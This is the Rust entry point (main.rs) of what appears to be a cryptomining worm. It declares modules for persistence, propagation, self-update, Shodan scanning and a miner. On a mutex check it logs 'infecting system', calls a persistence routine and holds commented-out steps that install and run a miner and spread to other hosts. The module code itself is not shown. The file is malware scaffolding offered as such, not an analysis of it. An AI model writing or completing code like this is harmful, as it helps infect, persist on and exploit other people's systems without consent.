mod persistance;
mod propogate;
mod update;
mod shodan;
mod miner;
mod mutex;

use miner::Miner;

use env_logger::{Builder, Env};
use log::{info, warn};


fn main() -> Result<(), Box<dyn std::error::Error>> {
    Builder::from_env(Env::default().default_filter_or("info")).init();

    match mutex::lock() {
        Some(_) => {
            info!("infecting system");

            persistance::init();

            /*
            let miner = Miner::new();

            miner.install()?;

            miner.enable_huge_pages();

            miner.run()?;
            */

            // propogate::run()

            loop {}
        },
        None => {
            warn!("already infected");
        },
    }

    Ok(())
}


